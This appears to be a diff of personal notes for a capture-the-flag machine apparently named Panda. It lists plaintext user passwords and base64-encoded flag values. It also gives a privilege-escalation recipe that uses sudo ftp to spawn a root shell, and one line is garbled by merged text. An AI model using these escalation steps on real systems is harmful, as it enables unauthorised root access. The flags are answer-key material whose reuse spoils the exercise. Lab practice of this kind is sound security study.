@@ -6,16 +6,22 @@ passwd: batman
 
 users:
 username: po
-passwd: password1
+passwd: password1sudo /usr/bin/ftp
 
 
 PANDA FLAGS:
-/root/.flag
-/home/po/flag.txt
-/home/shifu/flag.txt
-/home/tigress/flag.txt
-/var/www/html/flag/index.html (hex and b64)
-/var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
-/srv/samba/anonymous/binary (strings)
+NzRjZTk1ZDZhYTVmNTQyZmU5MDliMThkYzA2ZDRiYTMK
+MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK
+YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
+Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
+
+
+
+
+
+to get root with user shifu:
+sudo /usr/bin/ftp
+!/bin/sh
+find (suid's)
 
 ---END---
